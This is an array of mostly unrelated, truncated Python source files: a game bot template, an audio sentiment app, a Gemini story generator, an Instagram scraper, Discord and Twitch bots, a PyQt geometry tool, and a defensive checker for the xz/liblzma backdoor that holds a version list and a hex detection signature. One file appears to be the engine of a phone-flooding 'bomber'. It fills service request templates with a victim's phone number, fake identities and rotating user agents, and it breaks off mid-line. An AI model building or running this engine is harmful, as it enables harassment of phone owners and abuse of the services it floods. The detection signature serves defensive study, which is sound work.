    "import STcpClient\nimport numpy as np\nimport random\n\n'''\n    \u9078\u64c7\u8d77\u59cb\u4f4d\u7f6e\n    \u9078\u64c7\u7bc4\u570d\u50c5\u9650\u5834\u5730\u908a\u7de3(\u81f3\u5c11\u4e00\u500b\u65b9\u5411\u70ba\u7246)\n    \n    return: init_pos\n    init_pos=[x,y],\u4ee3\u8868\u8d77\u59cb\u4f4d\u7f6e\n    \n'''\n\n\ndef InitPos(mapStat):\n    init_pos = [0, 0]\n    '''\n        Write your code here\n\n    '''\n    return init_pos\n\n\n'''\n    \u7522\u51fa\u6307\u4ee4\n    \n    input: \n    playerID: \u4f60\u5728\u6b64\u5c40\u904a\u6232\u4e2d\u7684\u89d2\u8272(1~4)\n    mapStat : \u68cb\u76e4\u72c0\u614b(list of list), \u70ba 12*12\u77e9\u9663, \n              0=\u53ef\u79fb\u52d5\u5340\u57df, -1=\u969c\u7919, 1~4\u70ba\u73a9\u5bb61~4\u4f54\u9818\u5340\u57df\n    sheepStat : \u7f8a\u7fa4\u5206\u5e03\u72c0\u614b, \u7bc4\u570d\u57280~16, \u70ba 12*12\u77e9\u9663\n\n    return Step\n    Step : 3 elements, [(x,y), m, dir]\n            x, y \u8868\u793a\u8981\u9032\u884c\u52d5\u4f5c\u7684\u5ea7\u6a19 \n            m = \u8981\u5207\u5272\u6210\u7b2c\u4e8c\u7fa4\u7684\u7f8a\u7fa4\u6578\u91cf\n            dir = \u79fb\u52d5\u65b9\u5411(1~9),\u5c0d\u61c9\u65b9\u5411\u5982\u4e0b\u5716\u6240\u793a\n            1 2 3\n            4 X 5\n            7 8 9\n'''\ndef GetStep(playerID, mapStat, sheepStat):\n    step = [(0, 0), 0, 1]\n    '''\n    Write your code here\n    \n    '''\n    return step\n\n\n# player initial\n(id_package, playerID, mapStat) = STcpClient.GetMap()\ninit_pos = InitPos(mapStat)\nSTcpClient.SendInitPos(id_package, init_pos)\n\n# start game\nwhile (True):\n    (end_program, id_package, mapStat, sheepStat) = STcpClient.GetBoard()\n    if end_program:\n        STcpClient._StopConnect()\n        break\n    Step = GetStep(playerID, mapStat, sheepStat)\n\n    STcpClient.SendStep(id_package, Step)\n",
    "import streamlit as st\r\nimport assemblyai as ai\r\nimport matplotlib.pyplot as plt\r\nfrom wordcloud import WordCloud\r\n\r\nai.settings.api_key = \"API_KEY\"\r\n\r\nst.title(\"Customer Satisfaction from Audio Recording\")\r\n\r\nuploaded_file = st.file_uploader(\"Upload an audio file\", type=[\"mp3\",\"wav\"])\r\n\r\nif uploaded_file is not None:\r\n    audio_url = \"./temp_audio.mp3\" \r\n    with open(audio_url, \"wb\") as f:\r\n        f.write(uploaded_file.read())\r\n\r\n    config = ai.TranscriptionConfig(sentiment_analysis=True, auto_highlights=True)\r\n    transcript = ai.Transcriber().transcribe(audio_url, config)\r\n\r\n    positive_count = 1\r\n    neutral_count = 1\r\n    negative_count = 1\r\n\r\n    positive_score = 0\r\n    neutral_score = 0\r\n    negative_score = 0\r\n\r\n    for sentiment_result in transcript.sentiment_analysis:\r\n        if sentiment_result.sentiment == ai.SentimentType.positive:\r\n            positive_count += 1\r\n            positive_score += sentiment_result.confidence\r\n        elif sentiment_result.sentiment == ai.SentimentType.neutral:\r\n            neutral_count += 1\r\n            neutral_score += sentiment_result.confidence\r\n        else:\r\n            negative_count += 1\r\n            negative_score += sentiment_result.confidence\r\n\r\n    if positive_count > neutral_count and positive_count > negative_count:\r\n        sentiment = \"Positive\"\r\n        resultScore = positive_score / positive_count\r\n    elif negative_count > neutral_count and negative_count > positive_count:\r\n        sentiment = \"Negative\"\r\n        resultScore = negative_score / negative_count\r\n    else:\r\n        sentiment = \"Neutral\"\r\n        resultScore = neutral_score / neutral_count\r\n\r\n    st.subheader(\"Sentiment Analysis:\")\r\n    st.write(f\"Sentiment: {sentiment}\")\r\n    st.write(f\"Confidence Score: {resultScore:.2f}\")\r\n\r\n\r\n    st.subheader(\"Word Cloud of Highlighted Words:\")\r\n    highlights = []\r\n    for result in transcript.auto_highlights.results:\r\n        highlights.append(result.text)\r\n\r\n    highlighted_text = \" \".join(highlights)\r\n    wordcloud = WordCloud(width=800, height=400, background_color='white').generate(highlighted_text)\r\n    plt.figure(figsize=(10, 5))\r\n    plt.imshow(wordcloud, interpolation='bilinear')\r\n    plt.axis(\"off\")\r\n    st.pyplot(plt)\r\n",
    "import subprocess\nfrom loguru import logger\n\n\nVERSAO_VULNERAVEL = [\"5.6.0\", \"5.6.1\"]\n\n\ndef verificar_caminho_sshd():\n    try:\n        caminho_sshd = subprocess.run([\n            \"whereis\",\n            \"-b\",\n            \"sshd\"],\n            capture_output=True\n        )\n        caminho_sshd = caminho_sshd.stdout\n        retorno = caminho_sshd.decode(\"utf-8\").replace(\"\\n\", \"\")\n        retorno = retorno.split()\n        logger.info(f\"Caminho verificado: {retorno}\")\n        return retorno[1]\n    except Exception as e:\n        logger.error(e)\n        return False\n\n\ndef verificar_liblzma(path_sshd):\n    try:\n        logger.info(f\"Verificando ldd: {path_sshd}\")\n        ldd_output = subprocess.run([\"ldd\", path_sshd], capture_output=True)\n        ldd_output = ldd_output.stdout\n        path_liblzma = ldd_output.decode(\"utf-8\").split()\n        retorno_lista = list(filter(lambda x: 'liblzma' in x, path_liblzma))\n        logger.info(f\"Lista: {retorno_lista}\")\n        return retorno_lista[1]\n    except Exception as e:\n        logger.error(e)\n        return False\n\n\ndef verificar_xz():\n    try:\n        caminho_xz = subprocess.run([\n            \"whereis\",\n            \"-b\",\n            \"xz\"],\n            capture_output=True\n        )\n        caminho_xz = caminho_xz.stdout\n        logger.info(caminho_xz)\n        retorno = caminho_xz.decode(\"utf-8\").replace(\"\\n\", \"\")\n        retorno = retorno.split()\n        logger.info(f\"Caminho verificado: {retorno}\")\n        return retorno[1]\n    except Exception as e:\n        logger.error(e)\n        return False\ndef conferir_assinatura(path):\n    hex_dump_liblzma = subprocess.run([\n        \"hexdump\",\n        \"-ve\",\n        '1/1 \\\"%02x\\\"',\n        path],\n        capture_output=True\n    )\n    hex_dump_liblzma = hex_dump_liblzma.stdout\n    if \"f30f1efa554889f54c89ce5389fb81e7000000804883ec28488954241848894c2410\" in hex_dump_liblzma.decode(\"utf-8\"):\n        logger.warning(\"Assinatura da liblzma: VULNERAVEL\")\n    else:\n        logger.success(\"Assinatura da liblzma: OK\")\n\ndef conferir_xz_versao():\n    versao_xz = subprocess.run([\n        \"xz\",\n        \"--version\"\n    ],\n    capture_output=True)\n    versao_xz = versao_xz.stdout\n    versao_local = versao_xz.decode(\"utf-8\").split()\n    if versao_local[1] in VERSAO_VULNERAVEL:\n        logger.warning(\"xz VULNERAVEL\")\n    else:\n        logger.success(\"xz OK\")\n\n\nif __name__ == \"__main__\":\n    logger.info(\"Inicializando CVE...\")\n    vh = verificar_caminho_sshd()\n    vl = verificar_liblzma(vh)\n    conferir_assinatura(vl)\n    vz = verificar_xz()\n    conferir_xz_versao()\n    logger.info(\"Encerrando CVE...\")",
    "import argparse\nimport json\nimport jsoneditor\nimport logging\nimport random\nimport re\nimport requests\nimport string\nfrom dataclasses import dataclass\nfrom fake_useragent import UserAgent\nfrom pprint import pprint\n\nua = UserAgent()\n\nlogging.basicConfig(\n    level=logging.DEBUG,\n    format='%(levelname)s: %(message)s'\n)\n\nphone_pattern_legacy = re.compile(r'\\{formatted_phone:(.*)}')\nphone_pattern = re.compile(r'\\{phone:([^}]*)}')\n\n\n@dataclass\nclass Phone:\n    country_code: str\n    phone: str\n\n    def __str__(self):\n        return self.country_code + self.phone\n\n\n@dataclass\nclass FakeData:\n    first_name: str\n    last_name: str\n    password: str\n    email: str\n    username: str\n\n\ndef generate_fake_data():\n    first_name = random.choice([\"\u041c\u0430\u0440\u0438\u044f\", \"\u0410\u043d\u043d\u0430\", \"\u0415\u043a\u0430\u0442\u0435\u0440\u0438\u043d\u0430\", \"\u0421\u0432\u0435\u0442\u043b\u0430\u043d\u0430\", \"\u0418\u0440\u0438\u043d\u0430\", \"\u041e\u043b\u044c\u0433\u0430\"])\n    last_name = random.choice([\"\u0418\u0432\u0430\u043d\u043e\u0432\u0430\", \"\u041f\u0435\u0442\u0440\u043e\u0432\u0430\", \"\u0421\u043c\u0438\u0440\u043d\u043e\u0432\u0430\", \"\u041a\u0443\u0437\u043d\u0435\u0446\u043e\u0432\u0430\", \"\u0421\u043e\u043a\u043e\u043b\u043e\u0432\u0430\", \"\u041f\u043e\u043f\u043e\u0432\u0430\"])\n    password = ''.join(random.choices(string.ascii_letters + string.digits, k=8))\n    email = f\"{first_name.lower()}.{last_name.lower()}@{random.choice(['mail.ru', 'yandex.ru', 'gmail.com'])}\"\n    username = first_name.lower() + str(random.randint(100, 999))\n    return FakeData(first_name, last_name, password, email, username)\n\n\nfake_data = generate_fake_data()\n\nlogging.debug(\"Fake data: %s\", fake_data)\n\n\ndef format_phone(phone, mask):\n    formatted_phone = []\n    phone_index = 0\n    for symbol in mask:\n        if phone_index < len(phone):\n            if symbol == '*':\n                formatted_phone.append(phone[phone_index])\n                phone_index += 1\n            else:\n                formatted_phone.append(symbol)\n    return ''.join(formatted_phone)\n\n\ndef format_by_pattern(input_string, phone):\n    new_string = input_string\n\n    match_legacy = phone_pattern_legacy.search(input_string)\n    if match_legacy:\n        new_string = new_string.replace(\n            match_legacy.group(),\n            format_phone(str(phone), match_legacy.group(1))\n        )\n\n    match = phone_pattern.search(input_string)\n    if match:\n        new_string = new_string.replace(\n            match.group(),\n            format_phone(phone.phone, match.group(1))\n        )\n\n    replacements = {\n        \"full_phone\": str(phone),\n        \"phone\": phone.phone,\n        \"first_name\": fake_data.first_name,\n        \"last_name\": fake_data.last_name,\n        \"password\": fake_data.password,\n        \"email\": fake_data.email,\n        \"username\": fake_data.username\n    }\n\n    for key, value in replacements.items():\n        new_string = new_string.replace(\"{\" + key + \"}\", str(value))\n\n    return new_string\n\n\ndef process_request(request, phone):\n    url = format_by_pattern(request[\"url\"], phone)\n    logging.info(\"URL: %s\", url)\n\n    method = request.get(\"method\", \"POST\").upper()\n    logging.info(\"Method: %s\", method)\n\n    params = {\n        \"url\": url,\n        \"method\": method,\n        \"headers\": {\"User-Agent\": ua.random}\n    }\n\n    if \"headers\" in request:\n        for k, v in request[\"headers\"].items():\n            formatted_key = format_by_pattern(k, phone)\n            formatted_value = format_by_pattern(v, phone)\n            params[\"headers\"][formatted_key] = formatted_value\n\n        logging.info(\"Headers: %s\", params[\"headers\"])\n\n    if \"json\" in request:\n        json_body = format_by_pattern(\n            json.dumps(request[\"json\"]) if isinstance(request[\"json\"], dict) else request[\"json\"], phone)\n\n        try:\n            json.loads(json_body)\n        except Exception as e:\n            logging.warning(\"INVALID JSON BODY: %s, Error: %s\", json_body, str(e))\n\n        logging.debug(\"JSON Body: %s\", json_body)\n\n        params[\"json\"] = json.loads(json_body)\n\n    if \"params\" in request:\n        url_params = {\n            k: format_by_pattern(v, phone)\n            for k, v in request[\"params\"].items()\n        }\n\n        logging.debug(\"Params: %s\", url_params)\n\n        params[\"params\"] = url_params\n\n    if \"data\" in request:\n        form_data = {\n            format_by_pattern(k, phone): format_by_pattern(v, phone)\n            for k, v in request[\"data\"].items()\n        }\n\n        logging.debug(\"Form data Body: %s\", form_data)\n\n        params[\"data\"] = form_data\n\n    logging.debug(\"Sending request with params: %s\", params)\n\n    try:\n        response = requests.request(**params)\n        try:\n            pprint(response.json())\n        except json.JSONDecodeError:\n            print(response.text)\n    except requests.RequestException as e:\n        logging.error(\"Request failed: %s\", str(e))\n\n\ndef process_service(service, phone):\n    if \"requests\" in service:\n        for index, request in enumerate(service[\"requests\"]):\n            logging.info(\"Request #%s\", index)\n            process_request(request, phone)\n    else:\n        process_request(service, phone)\n\n\ndef process_services(services, phone):\n    if isinstance(services, list):\n        for index, service in enumerate(services):\n            logging.info(\"Service #%s\", index)\n            process_service(service, phon",
    "import os\nfrom datetime import datetime\nimport time\nimport re\nimport google.generativeai as genai\nfrom google.api_core import exceptions, retry\nfrom dotenv import load_dotenv\n\n# Load environment variables from .env file\nload_dotenv()\n\n# Configure the API key from the environment variable\nGOOGLE_API_KEY = os.getenv(\"GOOGLE_API_KEY\")\ngenai.configure(api_key=GOOGLE_API_KEY)\n\n# Define the models with descriptions\nMODELS = {\n    \"gemini-1.5-pro-latest\": {\n        \"model\": genai.GenerativeModel(\"gemini-1.5-pro-latest\"),\n        \"description\": \"Powerful model capable of handling text and image inputs, optimized for various language tasks like code generation, text editing, and problem solving.\",\n        \"rate_limit\": (2, 60),  # 2 queries per minute\n        \"daily_limit\": 1000,\n    },\n    \"gemini-1.0-pro-latest\": {\n        \"model\": genai.GenerativeModel(\"gemini-1.0-pro-latest\"),\n        \"description\": \"Versatile model for text generation and multi-turn conversations, suitable for zero-shot, one-shot, and few-shot tasks.\",\n        \"rate_limit\": (60, 60),  # 60 queries per minute\n    },\n}\n\n# For convenience, a simple wrapper to let the SDK handle error retries\n# Added specific exception handling\n\n\n@retry.Retry(\n    initial=0.1,\n    maximum=60.0,\n    multiplier=2.0,\n    deadline=600.0,\n    exceptions=(exceptions.GoogleAPICallError,),\n)\ndef generate_with_retry(model, prompt):\n    try:\n        return model.generate_content(prompt)\n    except exceptions.InvalidArgument as e:\n        raise ValueError(f\"Invalid input provided: {e}\")\n    except exceptions.DeadlineExceeded as e:\n        raise exceptions.DeadlineExceeded(\n            f\"Deadline exceeded while generating content: {e}\")\n    except exceptions.ResourceExhausted as e:\n        raise exceptions.ResourceExhausted(\n            f\"Resource exhausted (quota limit reached): {e}\")\n\n# Prompts\n\n\ndef get_persona():\n    print(\"Persona Options:\")\n    print(\"1. Award-winning science fiction author\")\n    print(\"2. Bestselling mystery novelist\")\n    print(\"3. Acclaimed fantasy writer\")\n    print(\"4. Custom persona\")\n    choice = input(\n        \"Enter the number corresponding to your desired persona (1-4): \")\n    if choice == \"1\":\n        return \"\"\"\n        You are an award-winning science fiction author with a penchant for expansive,\n        intricately woven stories. Your ultimate goal is to write the next award-winning\n        sci-fi novel.\n        \"\"\"\n    elif choice == \"2\":\n        return \"\"\"\n        You are a bestselling mystery novelist known for crafting intricate plots and\n        suspenseful narratives. Your aim is to keep readers guessing until the very end.\n        \"\"\"\n    elif choice == \"3\":\n        return \"\"\"\n        You are an acclaimed fantasy writer with a talent for creating immersive worlds\n        and compelling characters. Your goal is to transport readers to realms of magic\n        and adventure.\n        \"\"\"\n    elif choice == \"4\":\n        return input(\"Enter your custom persona description: \")\n    else:\n        print(\"Invalid choice. Using the default science fiction author persona.\")\n        return \"\"\"\n        You are an award-winning science fiction author with a penchant for expansive,\n        intricately woven stories. Your ultimate goal is to write the next award-winning\n        sci-fi novel.\n        \"\"\"\n\n\ndef get_writing_guidelines():\n    print(\"Writing Guideline Options:\")\n    print(\"1. Default guidelines\")\n    print(\"2. Descriptive and immersive\")\n    print(\"3. Fast-paced and action-oriented\")\n    print(\"4. Custom guidelines\")\n    choice = input(\n        \"Enter the number corresponding to your desired writing guidelines (1-4): \")\n    if choice == \"1\":\n        return \"\"\"\n        Writing Guidelines:\n        Delve deeper. Lose yourself in the world you're building. Unleash vivid\n        descriptions to paint the scenes in your reader's mind. Develop your\n        characters\u2014let their motivations, fears, and complexities unfold naturally.\n        Weave in the threads of your outline, but don't feel constrained by it. Allow\n        your story to surprise you as you write. Use rich imagery, sensory details, and\n        evocative language to bring the setting, characters, and events to life.\n        Introduce elements subtly that can blossom into complex subplots, relationships,\n        or world building details later in the story. Keep things intriguing but not\n        fully resolved. Avoid boxing the story into a corner too early. Plant the seeds\n        of subplots or potential character arc shifts that can be expanded later.\n        Remember, your main goal is to write as much as you can. If you get through\n        the story too fast, that is bad. Expand, never summarize.\n        \"\"\"\n    elif choice == \"2\":\n        return \"\"\"\n        Writing Guidelines:\n        Focus on creating a rich and immersive story world. Use vivid descriptions to\n        engage the reader's senses and bring the setting to life. Develop complex\n        characters with distinct per",
    "\r\n\"\"\"\r\nCreated By *Abdullah EL-Yamany*\r\n-------------------------------\r\n\"\"\"\r\n\r\nfrom selenium import webdriver\r\nfrom selenium.webdriver.common.by import By\r\nimport time, urllib.request\r\n\r\n\r\ndriver = webdriver.Chrome()\r\ndriver.get(\"https://www.instagram.com/\")\r\n\r\ntime.sleep(2)\r\n\r\n# -------- Login ------- #\r\nwhile True:\r\n    try:\r\n        username = driver.find_element(By.CSS_SELECTOR, 'input[name=\"username\"]')\r\n        password = driver.find_element(By.CSS_SELECTOR, 'input[name=\"password\"]')\r\n        break\r\n    except:\r\n        time.sleep(3)\r\n\r\nusername.clear()\r\npassword.clear()\r\nusername.send_keys(\"xxxxxxxxxxx\") # Write Email or Phone\r\npassword.send_keys(\"xxxxxxxxxxx\") # Write Password\r\n\r\ntime.sleep(1)\r\nlogin = driver.find_element(By.CSS_SELECTOR, 'button[type=\"submit\"]').click()\r\n\r\n#save your login info?\r\nwhile True:\r\n    time.sleep(5)\r\n    try:\r\n        notnow = driver.find_element(By.XPATH, '//div[@class=\"_ac8f\"]/div[@role=\"button\"]').click()\r\n        break\r\n    except:\r\n        continue\r\n\r\n\r\n#turn on notif\r\ntime.sleep(2)\r\nnotnow2 = driver.find_element(By.XPATH, \"//button[contains(text(), 'Not Now')]\").click()\r\n\r\n# post\r\npost_link = \"https://www.instagram.com/p/xxxxxxxxxxxxxxxxxxxxxxxx\" # Write Link Of Post\r\n\r\n\r\n#get videos and images\r\ndownload_url = ''\r\n\r\ndriver.get(post_link)\r\nshortcode = driver.current_url.split('/')[-2]\r\ntime.sleep(5)\r\n\r\nmain_div = driver.find_element(By.CSS_SELECTOR, 'div[class=\"x6s0dn4 x1dqoszc xu3j5b3 xm81vs4 x78zum5 x1iyjqo2 x1tjbqro\"]')\r\n\r\nimgs_link = []\r\n\r\nwhile True:\r\n    imgs = main_div.find_elements(By.CSS_SELECTOR, \"img[style='object-fit: cover;']\")\r\n    for img in imgs:\r\n        if img.get_attribute('src') not in imgs_link:\r\n            imgs_link.append(img.get_attribute('src'))\r\n    \r\n    try:\r\n        driver.find_element(By.CSS_SELECTOR, 'button[aria-label=\"Next\"]').click()\r\n        time.sleep(5)\r\n    except:\r\n        break\r\n\r\n\r\nnum = 1\r\ntime.sleep(3)\r\nfor link in imgs_link:\r\n    urllib.request.urlretrieve(link, f'img_{num}{shortcode}.jpg')\r\n    num += 1\r\n    time.sleep(6)\r\n\r\n",
    "# Description: cog that contains administration and fun commands\nfrom discord.ext import commands\nimport discord\nimport os\nimport random\n\nclass TextCommands(commands.Cog):\n\n    def __init__(self, bot):\n        self.bot = bot\n        bot.remove_command('help')\n\n\n    @commands.command()\n    async def balls(self, ctx):\n        await ctx.send(\"balls\")\n\n\n    @commands.command()\n    async def mog(self, ctx, User: discord.Member):\n            path = random.choice(os.listdir(\"images/mogged/\"))\n            await ctx.send(file=discord.File(\"images/mogged/\"+path))\n            await ctx.send(f\"{User.mention} bye bye \ud83e\udd2b\ud83e\uddcf\u200d\u2642\ufe0f\")\n\n\n    async def help(self, ctx):\n        embed = discord.Embed(title=\"Lista de comandos do commands\", description=\"Hey\", color=0xeee657)\n        embed.add_field(name=\"mogged\", value=\"Moga outro usu\u00e1rio\", inline=False)\n        embed.add_field(name=\"changeNickname\", value=\"Muda o nome\", inline=False)\n        embed.add_field(name=\"balls\", value=\"Hey doc\", inline=False)\n        await ctx.send(embed=embed)\n        \n\nasync def setup(bot):\n    await bot.add_cog(TextCommands(bot))",
    "from socket import socket\r\nimport re, os\r\n\r\ntry:\r\n    import yaml\r\n    from easygoogletranslate import EasyGoogleTranslate\r\n    import pyttsx3\r\n    from colorama import Fore\r\nexcept ModuleNotFoundError:\r\n    print(\"You are missing some Modules.. let me fix that.\")\r\n    os.system(\"pip install PyYAML easygoogletranslate pyttsx3 colorama\")\r\n    print(\"Finished installing Modules. Rerun the program.\")\r\n    \r\n# Needed for the Colors in Terminal (for windows atleast)\r\nos.system(\"color\")\r\n\r\n# Setup Translate\r\ngoogleTranslate = EasyGoogleTranslate()\r\n\r\n# Setup TTS\r\nengine = pyttsx3.init()\r\nengine.setProperty('voice', engine.getProperty('voices')[1].id)\r\n\r\n# Load Config Values\r\nwith open('config.yml', 'r') as file:\r\n    config = yaml.safe_load(file)\r\n    \r\n    server = config['server']\r\n    port = config['port']\r\n    nickname = config['nickname']\r\n    token = config['oauth']\r\n    channels = config['channels']\r\n    language = config['language']\r\n    tts = config['tts']\r\n    bot_check = config['bot_check']\r\n    bot_users = config['bot_users']\r\n\r\n\r\nsock = socket()\r\nsock.connect((server, port))\r\n\r\n# Provide Nickname and Oauth to Twitch so we can read the messages.\r\nsock.send(f\"PASS {token}\\n\".encode('utf-8'))\r\nsock.send(f\"NICK {nickname}\\n\".encode('utf-8'))\r\n\r\n# Join all Channels from the config\r\nfor channel in channels:\r\n    sock.send(f\"JOIN #{channel}\\n\".encode('utf-8'))\r\n\r\nwhile True:\r\n        resp = sock.recv(2048).decode('utf-8')\r\n\r\n        if resp.startswith('PING'):\r\n            sock.send(\"PONG\\n\".encode('utf-8'))\r\n        \r\n        elif len(resp) > 0:\r\n            if resp.startswith('PING'):\r\n                sock.send(\"PONG\\n\".encode('utf-8'))\r\n                \r\n            elif len(resp) > 0 and 'PRIVMSG' in resp:\r\n                    match = re.search(r':([^!]+)![^@]+@[^ ]+\\.tmi\\.twitch\\.tv PRIVMSG #([^ ]+) :(.+)', resp)\r\n                    if match:\r\n                        username, channel, message = match.groups()\r\n                        \r\n                        # Check if Message is not an Command\r\n                        if not message.startswith(\"!\"):\r\n                            translated_message = googleTranslate.translate(text=message, target_language=language)\r\n\r\n                        # TODO make this configurable\r\n                        print(f\"{Fore.CYAN} {channel} {Fore.RED} {username}{Fore.LIGHTBLUE_EX}: {Fore.WHITE}{translated_message} | {message}\")\r\n                        \r\n                        # Check if TTS is enabled and user is not a Bot.\r\n                        if tts:\r\n                            \r\n                            # ass code but i couldnt care less\r\n                            \r\n                            if bot_check:\r\n                                if not username in bot_users:\r\n                                    engine.say(f\"{channel}: {translated_message}\")\r\n                                    engine.runAndWait()\r\n                            else:\r\n                                engine.say(f\"{channel}: {translated_message}\")\r\n                                engine.runAndWait()",
    "import sys\nimport pandas as pd\nfrom shapely.geometry import (\n    Point,\n    LineString,\n    Polygon\n)\nfrom PyQt5.QtWidgets import (\n    QFileDialog,\n    QGraphicsScene,\n    QGraphicsItem,\n    QGraphicsEllipseItem,\n    QGraphicsRectItem,\n    QGraphicsLineItem,\n    QGraphicsPolygonItem,\n    QMainWindow,\n    QApplication,\n    QShortcut\n)\nfrom PyQt5.uic import loadUi\nfrom PyQt5.QtGui import (\n    QPainter,\n    QBrush,\n    QPen,\n    QPolygonF,\n    QKeySequence\n)\nfrom PyQt5.QtCore import (\n    QPointF,\n    QLineF,\n    Qt\n)\nimport itertools\n\n\nclass Window(QMainWindow):\n\n\n    def deleteItem(self):\n        '''\n        \u0423\u0434\u0430\u043b\u0435\u043d\u0438\u0435 \u0432\u044b\u0434\u0435\u043b\u0435\u043d\u043d\u043e\u0433\u043e \u043e\u0431\u044a\u0435\u043a\u0442\u0430\n        '''\n        items = self.scene.selectedItems()\n        if len(items) != 0:\n            for item in items:\n                self.scene.removeItem(item)\n\n\n    def saveNewItems(self):\n        '''\n        \u0421\u043e\u0445\u0440\u0430\u043d\u0435\u043d\u0438\u0435 \u043e\u0431\u044a\u0435\u043a\u0442\u043e\u0432 \u0432 \u0444\u0430\u0439\u043b\n        '''\n        items = self.scene.items()\n        if len(items) > 0:\n            with open('test_save_item.txt', 'w+') as fout:\n                for item in items:\n                    if item.type() == QGraphicsEllipseItem().type():\n                        coords = list(item.rect().getCoords()[0:2])\n                        row = ' '.join([ str(int(coord)) for coord in coords ])\n                    elif item.type() == QGraphicsRectItem().type():\n                        print(\"Rectangle\", list(item.rect().getCoords()))\n                    elif item.type() == QGraphicsLineItem().type():\n                        coords = [item.line().p1().x(), item.line().p1().y(), item.line().p2().x(), item.line().p2().y()]\n                        row = ' '.join([str(int(coord)) for coord in coords])\n                    elif item.type() == QGraphicsPolygonItem().type():\n                        coords = list(itertools.chain.from_iterable([[p.x(), p.y()] for p in item.polygon()]))\n                        row = ' '.join([str(int(coord)) for coord in coords])\n                    fout.writelines(row+'\\n')\n\n\n    def zoom(self, event):\n        '''\n        \u0418\u0437\u043c\u0435\u043d\u0435\u043d\u0438\u0435 \u0437\u0443\u043c\u0430 \u0441\u0446\u0435\u043d\u044b\n        :param event: \u0441\u043e\u0431\u044b\u0442\u0438\u0435\n        '''\n        zoomInFactor = 1.25\n        zoomOutFactor = 1 / zoomInFactor\n        if event.angleDelta().y() > 0:\n            zoomFactor = zoomInFactor\n        else:\n            zoomFactor = zoomOutFactor\n        self.graphicsView.scale(zoomFactor, zoomFactor)\n\n\n    def mousePressEvent(self, event):\n        if event.button() == Qt.LeftButton:\n            self.graphicsView.startPos = event.pos()\n        else:\n            super(Window,self).mousePressEvent(event)\n\n\n    def mouseMoveEvent(self, event):\n        if self.graphicsView.startPos is not None:\n            delta = self.graphicsView.startPos - event.pos()\n            transform = self.graphicsView.transform()\n            deltaX = delta.x() / transform.m11()\n            deltaY = delta.y() / transform.m22()\n            self.graphicsView.setSceneRect(self.graphicsView.sceneRect().translated(deltaX, deltaY))\n            self.graphicsView.startPos = event.pos()\n        else:\n             super(Window, self).mouseMoveEvent(event)\n\n\n    def mouseReleaseEvent(self, event):\n        self.graphicsView.startPos = None\n        super(Window, self).mouseReleaseEvent(event)\n\n\n    def create_ui(self):\n        '''\n        \u0417\u0430\u0433\u0440\u0443\u0437\u043a\u0430 \u0444\u0430\u0439\u043b\u0430 \u0441 \u0438\u043d\u0442\u0435\u0440\u0444\u0435\u0439\u0441\u043e\u043c .ui\n        '''\n\n        loadUi(\"gui.ui\",self)\n\n        self.scene = QGraphicsScene(self)\n        self.graphicsView.setBackgroundBrush(Qt.white)\n        self.graphicsView.setDragMode(self.graphicsView.ScrollHandDrag)\n        self.graphicsView.setRenderHints(QPainter.Antialiasing | QPainter.SmoothPixmapTransform)\n        self.graphicsView.setOptimizationFlag(self.graphicsView.DontAdjustForAntialiasing, True)\n        self.graphicsView.wheelEvent = self.zoom\n        self.graphicsView.mouseMoveEvent = self.mouseMoveEvent\n        self.graphicsView.mousePressEvent = self.mousePressEvent\n        self.graphicsView.mouseReleaseEvent = self.mouseReleaseEvent\n        self.graphicsView.startPos = None\n        self.blueBrush = QBrush(Qt.blue)\n        self.blackPen = QPen(Qt.black)\n        self.blackPen.setWidth(1)\n        self.redPen = QPen(Qt.black)\n        self.bluePen = QPen(Qt.blue)\n        self.redPen.setWidth(1)\n        self.bluePen.setWidth(1)\n        self.graphicsView.setScene(self.scene)\n\n\n    def chunks(self, lst, size):\n        '''\n        \u0421\u043e\u0431\u0438\u0440\u0430\u0435\u0442 \u043a\u043e\u043e\u0440\u0434\u0438\u043d\u0430\u0442\u043d\u044b\u0435 \u043f\u0430\u0440\u044b \u0434\u043b\u044f \u0441\u0442\u0440\u043e\u043a \u043f\u043e\u043b\u0443\u0447\u0435\u043d\u043d\u044b\u0445 \u0438\u0437 \u0444\u0430\u0439\u043b\u0430\n        :param lst: \u0441\u043f\u0438\u0441\u043e\u043a \u0441 \u043a\u043e\u043e\u0440\u0434\u0438\u043d\u0430\u0442\u0430\u043c\u0438\n        :param size: \u0440\u0430\u0437\u043c\u0435\u0440 \u043f\u043e\u0434\u0441\u043f\u0438\u0441\u043a\u043e\u0432\n        :return: \u043d\u0430\u0431\u043e\u0440 \u043a\u043e\u043e\u0440\u0434\u0438\u043d\u0430\u0442\u043d\u044b\u0445 \u043f\u0430\u0440\n        '''\n        return [lst[i:i + size] for i in range(0, len(lst), size)]\n\n\n    def type_geom(self, x):\n        '''\n        \u041e\u043f\u0440\u0435\u0434\u0435\u043b\u044f\u0435\u0442 \u0442\u0438\u043f \u0433\u0435\u043e\u043c\u0435\u0442\u0440\u0438\u0438 \u0432 \u0441\u043e\u043e\u0442\u0432\u0435\u0442\u0441\u0442\u0432\u0438\u0438 \u0441 \u043a\u043e\u043b\u0438\u0447\u0435\u0441\u0442\u0432\u043e\u043c \u044d\u043b\u0435\u043c\u0435\u043d\u0442\u043e\u0432 \u043f\u043e\u043b\u0443\u0447\u0435\u043d\u043d\u044b\u0445 \u0432 \u0444\u0430\u0439\u043b\u0435 \u0434\u043b\u044f \u043a\u0430\u0436\u0434\u043e\u0439 \u0441\u0442\u0440\u043e\u043a\u0438\n        :param x: \u0441\u0442\u0440\u043e\u043a\u0430 \u0438\u0437 \u0434\u0430\u0442\u0430\u0444\u0440\u0435\u0439\u043c\u0430\n        :return: \u0422\u0438\u043f \u0433\u0435\u043e\u043c\u0435\u0442\u0440\u0438\u0438\n        '''\n        if x['count_elements'] == 2:\n            return 'Point'\n        elif x['count_elements'] == 4:\n            return 'LineString'\n        elif x['count_eleme",
